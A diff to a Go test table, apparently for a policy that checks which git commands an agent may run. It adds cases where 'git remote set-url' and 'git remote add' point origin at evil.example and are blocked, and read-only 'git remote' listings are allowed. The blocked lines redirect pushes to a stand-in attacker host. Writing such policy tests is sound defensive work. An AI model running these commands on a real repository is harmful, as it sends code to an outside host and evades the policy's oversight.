@@ -128,6 +128,13 @@ func Table(policy Policy) []Case {
 		bash("-c overrides where a bare push lands", "git -c remote.origin.push=main push origin feat/x", "feat/x", true, "config write"),
 		bash("-c overrides the push url", "git -c remote.origin.pushurl=https://evil.example/x push origin feat/x", "feat/x", true, "config write"),
 		bash("git config writes .git/config unchecked", "git config remote.origin.push main", "feat/x", true, "host or toolkit config"),
+		bash("remote set-url redirects the next push", "git remote set-url origin https://evil.example/x", "feat/x", true, "host or toolkit config"),
+		bash("remote add writes .git/config", "git remote add evil https://evil.example/x", "feat/x", true, "host or toolkit config"),
+		bash("remote rename writes .git/config", "git remote rename origin old", "feat/x", true, "host or toolkit config"),
+		bash("remote set-url --push redirects the next push", "git remote set-url --push origin https://evil.example/x", "feat/x", true, "host or toolkit config"),
+		bash("remote -v only lists", "git remote -v", "feat/x", false, ""),
+		bash("remote get-url only reads", "git remote get-url origin", "feat/x", false, ""),
+		bash("a bare remote only lists", "git remote", "feat/x", false, ""),
 
 		// 1b. A wrapper, a chain, or an assignment never hides the real command.
 		bash("push to main through env", "env git push origin main", "feat/x", true, "open a pull request"),
